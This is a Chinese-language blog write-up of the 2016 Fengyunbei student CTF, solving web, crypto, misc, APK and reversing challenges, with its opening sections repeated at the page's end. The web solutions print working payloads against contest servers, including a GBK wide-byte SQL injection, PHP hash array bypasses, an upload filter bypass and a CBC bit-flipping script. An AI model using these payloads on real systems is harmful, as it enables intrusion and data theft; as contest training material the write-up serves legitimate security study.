<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<title>Bendawang's Site</title>
<link href="./2016风云杯大学生信安大赛-WriteUp/font-awesome.min.css" rel="stylesheet"/>
<link href="./2016风云杯大学生信安大赛-WriteUp/screen.css" rel="stylesheet"/>
<link href="./2016风云杯大学生信安大赛-WriteUp/prism_okaidia.css" rel="stylesheet"/>
<link href="./2016风云杯大学生信安大赛-WriteUp/bendawang.css" rel="stylesheet"/>
<script src="./2016风云杯大学生信安大赛-WriteUp/jquery.min.js"></script>
</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
<div class="show-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img src="./2016风云杯大学生信安大赛-WriteUp/bendawang.png" style="display:block;width:100%;"/></a>
</h1>
</div>
<div class="grid hide-on-mobiles">
<div class="unit test2 hide-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img alt="" height="115" src="./2016风云杯大学生信安大赛-WriteUp/bendawang.png" width="449"/></a>
</h1>
</div>
<nav class="main-nav unit test1 hide-on-mobiles">
<ul>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
</div>
</header>
<script>
$('document').ready(function(){
    $('li[class]:eq(4)').attr('class','current');
});
</script>
<section class="docs">
<div class="grid">
<!--移动端-->
<div class="show-on-mobiles">
<div class="article-info profile-block">
<div class="article-info-block">
               55
               <span>文章</span>
</div>
<div class="article-info-block">
               5
               <span>标签</span>
</div>
</div>
<div class="profile-block social-links">
<table>
<tbody><tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i></a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i></a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i></a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody></table>
</div>
<div class="whole show-on-mobiles">
<article class="bdw_article">
<div class="Bendawang" id="Bendawang_mobile">
<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
<div class="Bendawang_content" id="Bendawang_content_mobile"></div>

<br/>
<br/>
<h1 id="2016"><strong>2016风云杯大学生信安大赛</strong></h1>
<p style="max-width:100%;height:auto;">好吧第二次正式打CTF，虽然这次的题比较简单，而且大部分强队都去打whctf去了，最后10分钟直接从第四掉到第七，也没办法，实力不够，继续练吧，贴个图纪念一下。整体看这次的web还是比较中规中矩的，没有过分的脑洞。自己也犯蠢了，以为web做完了，结果最后才发现<code style="max-width:100%;height:auto;">web 07</code>没有做真是哔了狗了。。
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe6155e6ec75290000af.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web01"><strong>web 01</strong></h2>
<p style="max-width:100%;height:auto;">代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php 
highlight_file(&amp;apos;2.php&amp;apos;);
$key=&amp;apos;KEY{********************************}&amp;apos;;
$IsMatch= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IsMatch ){ 
  die(&amp;apos;key: &amp;apos;.$key);
}
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">一个正则匹配
payload如下</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://219.146.15.116/4t56ysgh6h7u/?id=keykeykeykeykeykeykey:/a/aakeya:]
</code></pre>
<p style="max-width:100%;height:auto;">得到最后的<code style="max-width:100%;height:auto;">flag</code></p>
<h2 id="web02"><strong>web 02</strong></h2>
<p style="max-width:100%;height:auto;">乌云上的一个漏洞，http://www.wooyun.org/bugs/wooyun-2015-0125982。</p>
<p style="max-width:100%;height:auto;">把<code style="max-width:100%;height:auto;">multipart/form-data</code>变换一下大小写，然后把<code style="max-width:100%;height:auto;">Content-Type</code>换成随便一个图片格式就行了，没截图，记得flag是这个</p>
<pre><code style="max-width:100%;height:auto;">KEY{bb9935dc12397882af23rghjwe3820ea2b678}
</code></pre>
<h2 id="web03"><strong>web 03</strong></h2>
<p style="max-width:100%;height:auto;">代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
extract($_GET);
if (!empty($dpc))
{
$combination = trim(file_get_contents($filename));
if ($dpc === $combination)
{
echo "&lt;p&gt;Hello:" ." $combination!?&lt;/p&gt;";

echo "&lt;p&gt;Congratulation.Key is:" ." $flag&lt;/p&gt;";
}
else
{
echo "&lt;p&gt;sorry!&lt;/p&gt;";
}
}
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">一道简单的审计题，根据file<em>get</em>contents可以远程打开文件的特性，在你的vps或是别的什么上放一个<code style="max-width:100%;height:auto;">1.txt</code>，内容是<code style="max-width:100%;height:auto;">1234</code>，然后就可以了，payload如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://139.129.166.67/gth56u778i8/?filename=http://xxxxxxxxxxxxxxx/1.txt&amp;dpc=1234
</code></pre>
<h2 id="web04"><strong>web 04</strong></h2>
<p style="max-width:100%;height:auto;">根据提示，要POST一个<code style="max-width:100%;height:auto;">username</code>和<code style="max-width:100%;height:auto;">password</code>，还要二者的md5值相同，那么最后果断构造如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">username=240610708&amp;password=QNKCDZO
</code></pre>
<p style="max-width:100%;height:auto;">不对。再试试这个</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">username[]=240610708&amp;password[]=QNKCDZO
</code></pre>
<p style="max-width:100%;height:auto;">对了，然后提示说不是admin，看看cookie，果断改一下就可以了，一个base64，
所以最后的payload如下图：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe7055e6ec75290000b0.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web05"><strong>web 05</strong></h2>
<p style="max-width:100%;height:auto;">通过备份文件<code style="max-width:100%;height:auto;">~</code>看到源码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
$_GET[&amp;apos;myid&amp;apos;] = urldecode($_GET[&amp;apos;myid&amp;apos;]);

$flag = &amp;apos;xxxxxxxxxxxxxxxxx&amp;apos;;
if (isset($_GET[&amp;apos;name&amp;apos;]) and isset($_POST[&amp;apos;password&amp;apos;])) {

if ($_GET[&amp;apos;name&amp;apos;] == $_POST[&amp;apos;password&amp;apos;])

print &amp;apos;Your password can not be your name.&amp;apos;;

else if (sha1($_GET[&amp;apos;name&amp;apos;]) === sha1($_POST[&amp;apos;password&amp;apos;])&amp;($_GET[&amp;apos;myid&amp;apos;]==&amp;apos;anyun&amp;apos;))

die(&amp;apos;Flag: &amp;apos;.$flag);

else

print &amp;apos;sorry!&amp;apos;;

}
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">直接用数组绕过就可以了
payload如下：</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe7755e6ec75290000b1.png" style="max-width:100%;height:auto;"/><br/>
得到flag</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe7b55e6ec75290000b2.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web06"><strong>web 06</strong></h2>
<p style="max-width:100%;height:auto;">mysql宽字符注入，没有别的过滤，直接构造联合查询从系统表<code style="max-width:100%;height:auto;">information_schema</code>里面爆出表名和列名，这里注意下编码的转换就行了，别的没有什么坑点，该数据库下面有两个表<code style="max-width:100%;height:auto;">article,flag</code>，<code style="max-width:100%;height:auto;">flag</code>表里有两个字段<code style="max-width:100%;height:auto;">id,thisisflag</code>，最后给个<code style="max-width:100%;height:auto;">payload</code></p>
<pre><code class="sql language-sql" style="max-width:100%;height:auto;">http://139.129.166.67/5t5y6huj7j7/index.php?id=1%c0&amp;apos; and 1=2 union select 1,convert(group_concat(thisisflag) using gbk) from flag--+
</code></pre>
<p style="max-width:100%;height:auto;">然后的得到<code style="max-width:100%;height:auto;">flag</code>。
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe8255e6ec75290000b3.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web08"><strong>web 08</strong></h2>
<p style="max-width:100%;height:auto;">一道CBC字节翻转攻击，给个链接：http://drops.wooyun.org/tips/7828
根据文章写POC,代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
        //1234567890abcdef1234567890abcdef1234567890abcdef1234567890auid=9;123123123123
        $enc = "9pzE4775q38+wGl/FqNMfFM53Ra6wTKAGUykoeioOjKzlajhqgjsPjGiXVvkFF2BwdywFE67ELLaNuU5yS0kjiuETsjG0Jdk4LiwwBst8ig=";
        $enc = base64_decode($enc);
        echo "&lt;br&gt;".($enc)."&lt;br&gt;";
        $enc[47] = chr(ord($enc[47]) ^ ord("9") ^ ord ("1"));
        echo "&lt;br&gt;".($enc)."&lt;br&gt;"; 
        $c = base64_encode($enc);
        $d = urlencode($c);
        echo "Plaintext after attack : &lt;br&gt;$c&lt;br&gt;";
        echo "Plaintext after attack : &lt;br&gt;$d&lt;br&gt;";
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">得到如下：</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe8f55e6ec75290000b5.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">即</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">9pzE4775q38%2BwGl%2FFqNMfFM53Ra6wTKAGUykoeioOjKzlajhqgjsPjGiXVvkFF2JwdywFE67ELLaNuU5yS0kjiuETsjG0Jdk4LiwwBst8ig%3D
</code></pre>
<p style="max-width:100%;height:auto;">然后修改cookie直接提交，即获得flag</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe8955e6ec75290000b4.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web09"><strong>web 09</strong></h2>
<p style="max-width:100%;height:auto;">这道题一开始就跳转到了这里</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://139.129.166.67/sefrgtafgr/index.php?line=&amp;file=a2V5LnR4dA==
</code></pre>
<p style="max-width:100%;height:auto;">出现一堆没用的东西，对<code style="max-width:100%;height:auto;">file</code>解码是key.txt，换成<code style="max-width:100%;height:auto;">index.php</code>后发现，这里存在任意代码读取，不断修改line的值得到<code style="max-width:100%;height:auto;">index.php</code>完整代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
error_reporting(0); 
$file=base64_decode(isset($_GET[&amp;apos;file&amp;apos;])?$_GET[&amp;apos;file&amp;apos;]:""); 
$line=isset($_GET[&amp;apos;line&amp;apos;])?intval($_GET[&amp;apos;line&amp;apos;]):0; 
if($file==&amp;apos;&amp;apos;) header("location:index.php?line=&amp;file=a2V5LnR4dA=="); 
$file_list = array( 
&amp;apos;0&amp;apos; =&gt;&amp;apos;key.txt&amp;apos;, 
&amp;apos;1&amp;apos; =&gt;&amp;apos;index.php&amp;apos;, 
); 
if(isset($_COOKIE[&amp;apos;key&amp;apos;]) &amp;&amp; $_COOKIE[&amp;apos;key&amp;apos;]==&amp;apos;an_yun_tec&amp;apos;){  
$file_list[2]=&amp;apos;thisis_key.php&amp;apos;; 
} 
if(in_array($file, $file_list)){ 
$fa = file($file); 
echo $fa[$line]; 
} 
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后审计下构造如下请求：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe9655e6ec75290000b6.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">于是得到flag是<code style="max-width:100%;height:auto;">KEY{key_anyuntec_co0kies}</code>。 </p>
<h2 id="crypto01"><strong>CRYPTO 01</strong></h2>
<p style="max-width:100%;height:auto;">一道培根加密，
原文是</p>
<pre><code style="max-width:100%;height:auto;">woUld you prEfeR SausaGes or bacoN  wiTH YouR EgG?
</code></pre>
<p style="max-width:100%;height:auto;">换过来变成</p>
<pre><code style="max-width:100%;height:auto;">aabaa aaaaa baabb aaaab aaaaa aaaba abbba abbab
</code></pre>
<p style="max-width:100%;height:auto;">百度百科里的第一个表，换成答案就是</p>
<pre><code style="max-width:100%;height:auto;">eatbacon
</code></pre>
<h2 id="misc01">misc 01</h2>
<p style="max-width:100%;height:auto;">winhex打开得到的JPG图片，在文件exif发现一串可疑字符ZmxhZ3tsdW9fcm9vbX0，加上=base64解码后得到
<code style="max-width:100%;height:auto;">flag{luo_room}</code></p>
<h2 id="misc02">misc 02</h2>
<p style="max-width:100%;height:auto;">解压后得到jpg图像，从图像的文件结尾后抠出了一个zip压缩包，判断了一下不是伪加密，根据提示银行卡密码，用工具暴力破了一下，得到了文件密码，解压后得到了flag.txt
<code style="max-width:100%;height:auto;">KEY{luffy_and_jet}</code></p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe9c55e6ec75290000b7.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="misc03">misc 03</h2>
<p style="max-width:100%;height:auto;">解压后得到一张jpg，用winhex看了一下头部 直接得到flag···什么鬼···</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbea155e6ec75290000b8.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="misc06">misc 06</h2>
<p style="max-width:100%;height:auto;">观察了一下数据包，是ftp传输，有几个包特别显眼如下：
<br/><img alt="图片标题" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/getImagefileId=57372cbfab64413fd700f133" style="max-width:100%;height:auto;"/><br/>
把他们都用winhex抠出来，data3是一个带加密的zip文件，data5说社社会工程学说，很多用户习惯于用一样的密码。试了一下其他几个data中的密码都不对，重新去观察数据包，观察到下图中的包：
<br/><img alt="图片标题" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/getImagefileId=57372d8aab644141b100f034" style="max-width:100%;height:auto;"/><br/>
得到密码whoami127.0.0.1，尝试解压，成功！得到<code style="max-width:100%;height:auto;">KEY{351d5ead1ca31ed33deb6f6a3111e117}</code></p>
<h2 id="apk01">apk 01</h2>
<p style="max-width:100%;height:auto;">打开zip文件发现需要密码，立马反应到这是伪加密</p>
<p style="max-width:100%;height:auto;">为了偷懒把他的加密位用网上的脚本将一改成零即可</p>
<p style="max-width:100%;height:auto;">apk变成普通的apk后再按正常步骤：</p>
<p style="max-width:100%;height:auto;">在<code style="max-width:100%;height:auto;">AndroidManifest.xml</code>文件中可以发现</p>
<pre><code style="max-width:100%;height:auto;">//KEY{f2b0590b558a08514e1c497d400d08ba}
</code></pre>
<h2 id="apk03">apk 03</h2>
<p style="max-width:100%;height:auto;">这哈哈都写出来了，明显是忽悠人的。。。</p>
<p style="max-width:100%;height:auto;">在<code style="max-width:100%;height:auto;">FlagActivity</code>里能看到</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">    int[] arrayOfInt = { 75, 69, 89, 123, 97, 119, 52, 110, 110, 52, 95, 107, 52, 114, 95, 109, 120, 95, 100, 51, 120, 125 };
</code></pre>
<p style="max-width:100%;height:auto;">ascii码转换一下就是答案</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">    KEY{aw4nn4_k4r_mx_d3x}
</code></pre>
<h2 id="apk04">apk 04</h2>
<p style="max-width:100%;height:auto;">函数有点多，看着有点蛋疼，全都看一遍就好了，其实并不难。</p>
<p style="max-width:100%;height:auto;">纯分析的话不用写一行代码就能做出这道题，下面我把我分析的步骤都写出来，具体分析步骤如下</p>
<p style="max-width:100%;height:auto;">在<code style="max-width:100%;height:auto;">uc</code>这个class里比较显眼</p>
<pre><code style="max-width:100%;height:auto;">public static String nj = "XRL}D6hy4yfE7tuF6{";
</code></pre>
<p style="max-width:100%;height:auto;">这个太扎眼了，一眼就能看出来</p>
<p style="max-width:100%;height:auto;">因为看过前面的函数有印象：</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">while (true)
{
str = str + c;
i++;
break;
if ((j &gt;= 65) &amp;&amp; (j &lt;= 77))
c = (char)(j + 13);
else if ((j &gt;= 110) &amp;&amp; (j &lt;= 122))
c = (char)(j - 13);
else if ((j &gt;= 78) &amp;&amp; (j &lt;= 90))
c = (char)(j - 13);
else if ((j &gt;= 48) &amp;&amp; (j &lt;= 57))
c = (char)(j ^ 0x7);
else
c = (char)(j ^ 0x6);
}
</code></pre>
<p style="max-width:100%;height:auto;">两个大括号反过来了就是因为这里的</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">else
c = (char)(j ^ 0x6);
</code></pre>
<p style="max-width:100%;height:auto;">else就是除了数字和字母之外的字符
和<code style="max-width:100%;height:auto;">0x6</code>异或刚好就把最低位反过来然后括号反过来了</p>
<p style="max-width:100%;height:auto;">然后调用函数的时候:</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">uc.bh(cc.encrypt(str1), ca.encrypt(str1), cb.encode(str1));
</code></pre>
<p style="max-width:100%;height:auto;">之后：</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">public static boolean bh(String paramString1, String paramString2, String paramString3)
{
String str = paramString1 + paramString2 + paramString3;
</code></pre>
<p style="max-width:100%;height:auto;">可见他用了三个函数，但是因为前面分析的括号可知研究第一个加密函数就可以了</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">public static String encrypt(String paramString)
{
String str = "";
int i = 0;
if (i &gt;= paramString.length())
return str;
int j = paramString.charAt(i);
char c;
if ((j &gt;= 97) &amp;&amp; (j &lt;= 109))
c = (char)(j + 13);
while (true)
{
str = str + c;
i++;
break;
if ((j &gt;= 65) &amp;&amp; (j &lt;= 77))
c = (char)(j + 13);
else if ((j &gt;= 110) &amp;&amp; (j &lt;= 122))
c = (char)(j - 13);
else if ((j &gt;= 78) &amp;&amp; (j &lt;= 90))
c = (char)(j - 13);
else if ((j &gt;= 48) &amp;&amp; (j &lt;= 57))
c = (char)(j ^ 0x7);
else
c = (char)(j ^ 0x6);
}
}
</code></pre>
<p style="max-width:100%;height:auto;">这个函数的意思一看便懂：上半边字母表和下半边字母表对换
数字的话异或一下，还原出来就是：</p>
<pre><code style="max-width:100%;height:auto;">XRL}D6hy4yfE7tuF6{ --&gt;
KEY{Q1ul3lsR0ghS1}
</code></pre>
<h2 id="re01">re 01</h2>
<p style="max-width:100%;height:auto;">首先通过PEID查看，发现是upx壳，在机脱失败后，直接采取手脱，到达程序入口。</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbec055e6ec75290000b9.png" style="max-width:100%;height:auto;"/><br/>
发现本题是简单的字符串比较，并不存在什么难点
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbec455e6ec75290000ba.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">得到flag。
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbecb55e6ec75290000bb.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="re03">re 03</h2>
<p style="max-width:100%;height:auto;">加载进OD观察下，发现没有加壳，需要输入用户名和密码：</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbed155e6ec75290000bc.png" style="max-width:100%;height:auto;"/><br/>
两个对于长度有一些限制，用户名可以直接得到</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbed555e6ec75290000bd.png" style="max-width:100%;height:auto;"/><br/>
对于密码则采用了异或比较的方式：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbed955e6ec75290000be.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">写个脚本模拟一下：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbedf55e6ec75290000bf.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">得到结果：
McDull@Aun
YuyuMyl@ve!</p>
<h2 id="re04">re 04</h2>
<p style="max-width:100%;height:auto;">用od加载发现有反调试，于是用ida加载进来，观察了一下函数的基本结构。
主体就是简单的for循环，在特定时候调用输出函数，所以我们只要模拟下就行了。</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">    #include"stdio.h"

    __int8 byte_40336D,byte_40336F,byte_40336E,byte_40336C;

    int sub_401920()
    {
      return printf(
               "%c%c%c%c",
               (unsigned __int8)byte_40336D,
               (unsigned __int8)byte_40336F,
               (unsigned __int8)byte_40336E,
               (unsigned __int8)byte_40336C);
    }

    int __cdecl sub_401960(int a1)
    {
      signed int v2; // [sp+0h] [bp-10h]@5
      signed int v3; // [sp+4h] [bp-Ch]@7
      signed int v4; // [sp+8h] [bp-8h]@3
      signed int v5; // [sp+Ch] [bp-4h]@1



      byte_40336D = *(__int8 *)a1;
      byte_40336F = *(__int8 *)(a1 + 1);
      byte_40336E = *(__int8 *)(a1 + 2);
      byte_40336C = *(__int8 *)(a1 + 3);
      v5 = 5;
      do
      {
        byte_40336D += v5;
        byte_40336D ^= 3u;
        --v5;
      }
      while ( v5 );
      v4 = 4;
      do
      {
        byte_40336F += v4;
        byte_40336F ^= 4u;
        --v4;
      }
      while ( v4 );
      v2 = 3;
      do
      {
        byte_40336E += v2;
        byte_40336E ^= 5u;
        --v2;
      }
      while ( v2 );
      v3 = 2;
      do
      {
        byte_40336C += v3;
        byte_40336C ^= 6u;
        --v3;
      }
      while ( v3 );
      return 0;
    }

    int __cdecl sub_401A70(int a1)
    {
      int result; // eax@1
      unsigned int l; // [sp+0h] [bp-1Ch]@7
      unsigned int k; // [sp+4h] [bp-18h]@5
      unsigned int i; // [sp+8h] [bp-14h]@1
      char v5; // [sp+Ch] [bp-10h]@9
      char v6; // [sp+Dh] [bp-Fh]@9
      char v7; // [sp+Eh] [bp-Eh]@9
      char v8; // [sp+Fh] [bp-Dh]@9
      unsigned int j; // [sp+10h] [bp-Ch]@3
      int v10; // [sp+14h] [bp-8h]@1
      int v11; // [sp+18h] [bp-4h]@1

      v10 = 0;
      v11 = 0;
      for ( i = 0; i &lt;= 0xFF; ++i )
      {
        printf("^");
        for ( j = 0; j &lt;= 0xFF; ++j )
        {
          for ( k = 0; k &lt;= 0xFF; ++k )
          {
            for ( l = 0; l &lt;= 0xFF; ++l )
            {
              ++v10;
              v5 = j;
              v6 = i;
              v7 = l;
              v8 = k;

              char arry[4];
              arry[0]=v5;
              arry[1]=v6;
              arry[2]=v7;
              arry[3]=v8;
              if ( v10 == a1 )
              {
                  sub_401960((int)arry);
                  sub_401920();
              }

            }
          }
        }
        result = i + 1;
      }
      return result;
    } 

    int __cdecl main()
    {
      sub_401A70(1147021405);
      sub_401A70(942305638);
      sub_401A70(493974365);
      sub_401A70(942764337);
      printf("\n不是这里       ..什么也没有    \n");
      return 0;
    }
</code></pre>
<p style="max-width:100%;height:auto;"><br/>
模拟结果如下，得到答案：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbeed55e6ec75290000c0.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">flag：jN<em>+6Bnp?</em>rGB;p</p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>



<!--PC端-->
<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
<div class="inner profile-inner">
<div class="base-info profile-block">
<img id="avatar" src="./2016风云杯大学生信安大赛-WriteUp/logo.jpg"/>
<h2 id="name" style="text-align:center">Bendawang</h2>
<span id="location" style="font-size:18px">
<i class="fa fa-map-marker"></i>SiChuan, China</span>
<a href="/about" id="follow">联系我</a></div>
<div class="article-info profile-block">
<div class="article-info-block">
        55
          <span>文章</span></div>
<div class="article-info-block">
        5
          <span>标签</span></div>
</div>
<div class="profile-block social-links hide-on-mobiles">
<table>
<tbody>
<tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i>
</a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i>
</a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i>
</a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div class="unit three-quarters hide-on-mobiles">
<article class="bdw_article">
<h1 id="2016"><strong>2016风云杯大学生信安大赛</strong></h1>
<p style="max-width:100%;height:auto;">好吧第二次正式打CTF，虽然这次的题比较简单，而且大部分强队都去打whctf去了，最后10分钟直接从第四掉到第七，也没办法，实力不够，继续练吧，贴个图纪念一下。整体看这次的web还是比较中规中矩的，没有过分的脑洞。自己也犯蠢了，以为web做完了，结果最后才发现<code style="max-width:100%;height:auto;">web 07</code>没有做真是哔了狗了。。
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe6155e6ec75290000af.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web01"><strong>web 01</strong></h2>
<p style="max-width:100%;height:auto;">代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php 
highlight_file(&amp;apos;2.php&amp;apos;);
$key=&amp;apos;KEY{********************************}&amp;apos;;
$IsMatch= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IsMatch ){ 
  die(&amp;apos;key: &amp;apos;.$key);
}
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">一个正则匹配
payload如下</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://219.146.15.116/4t56ysgh6h7u/?id=keykeykeykeykeykeykey:/a/aakeya:]
</code></pre>
<p style="max-width:100%;height:auto;">得到最后的<code style="max-width:100%;height:auto;">flag</code></p>
<h2 id="web02"><strong>web 02</strong></h2>
<p style="max-width:100%;height:auto;">乌云上的一个漏洞，http://www.wooyun.org/bugs/wooyun-2015-0125982。</p>
<p style="max-width:100%;height:auto;">把<code style="max-width:100%;height:auto;">multipart/form-data</code>变换一下大小写，然后把<code style="max-width:100%;height:auto;">Content-Type</code>换成随便一个图片格式就行了，没截图，记得flag是这个</p>
<pre><code style="max-width:100%;height:auto;">KEY{bb9935dc12397882af23rghjwe3820ea2b678}
</code></pre>
<h2 id="web03"><strong>web 03</strong></h2>
<p style="max-width:100%;height:auto;">代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
extract($_GET);
if (!empty($dpc))
{
$combination = trim(file_get_contents($filename));
if ($dpc === $combination)
{
echo "&lt;p&gt;Hello:" ." $combination!?&lt;/p&gt;";

echo "&lt;p&gt;Congratulation.Key is:" ." $flag&lt;/p&gt;";
}
else
{
echo "&lt;p&gt;sorry!&lt;/p&gt;";
}
}
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">一道简单的审计题，根据file<em>get</em>contents可以远程打开文件的特性，在你的vps或是别的什么上放一个<code style="max-width:100%;height:auto;">1.txt</code>，内容是<code style="max-width:100%;height:auto;">1234</code>，然后就可以了，payload如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://139.129.166.67/gth56u778i8/?filename=http://xxxxxxxxxxxxxxx/1.txt&amp;dpc=1234
</code></pre>
<h2 id="web04"><strong>web 04</strong></h2>
<p style="max-width:100%;height:auto;">根据提示，要POST一个<code style="max-width:100%;height:auto;">username</code>和<code style="max-width:100%;height:auto;">password</code>，还要二者的md5值相同，那么最后果断构造如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">username=240610708&amp;password=QNKCDZO
</code></pre>
<p style="max-width:100%;height:auto;">不对。再试试这个</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">username[]=240610708&amp;password[]=QNKCDZO
</code></pre>
<p style="max-width:100%;height:auto;">对了，然后提示说不是admin，看看cookie，果断改一下就可以了，一个base64，
所以最后的payload如下图：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe7055e6ec75290000b0.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web05"><strong>web 05</strong></h2>
